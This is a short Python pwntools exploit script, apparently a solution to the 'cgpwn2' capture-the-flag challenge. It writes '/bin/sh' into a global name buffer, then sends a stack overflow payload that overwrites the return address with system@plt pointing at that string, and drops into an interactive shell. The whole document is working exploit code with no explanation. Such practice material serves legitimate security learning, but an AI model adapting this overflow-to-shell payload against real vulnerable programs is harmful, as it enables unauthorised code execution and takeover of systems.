# coding:UTF-8
# author:iopr

from pwn import *
context(os='linux',arch='i386')

Debug=1
if Debug:
    io=process('./cgpwn2')
else:
    pass

buf=0xBF926BF2
ret=0xBF926C10
bss_name=0x0804A080
elf=ELF('./cgpwn2')

def main():
    io.recvuntil('please tell me your name\n')
    io.sendline('/bin/sh\x00')
    io.recvuntil('hello,you can leave some message here:\n')
    io.sendline((ret-buf+12)*'a'+p32(elf.plt['system'])+p32(0)+p32(bss_name))
    io.interactive()

pause()
main()